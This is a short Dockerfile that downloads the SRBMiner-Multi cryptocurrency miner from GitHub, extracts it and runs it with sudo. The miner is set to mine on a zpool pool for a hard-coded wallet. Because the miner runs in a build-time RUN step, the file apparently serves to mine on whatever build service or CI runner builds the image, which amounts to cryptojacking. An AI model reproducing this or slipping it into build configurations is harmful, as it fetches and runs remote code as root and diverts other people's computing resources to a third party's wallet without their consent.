# Use a base image with necessary dependencies
FROM ubuntu:latest

# Install necessary packages
RUN apt-get update && \
    apt-get install -y curl tar sudo

# Download SRBMiner-Multi, extract, and run the command
RUN curl https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.4/SRBMiner-Multi-2-5-4-Linux.tar.gz -L -O -J && \
    tar -xf SRBMiner-Multi-2-5-4-Linux.tar.gz && \
    cd SRBMiner-Multi-2-5-4 && \
    sudo ./SRBMiner-MULTI --algorithm minotaurx --pool minotaurx.sea.mine.zpool.ca:7019 --wallet R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q --password c=RVN --keepalive true
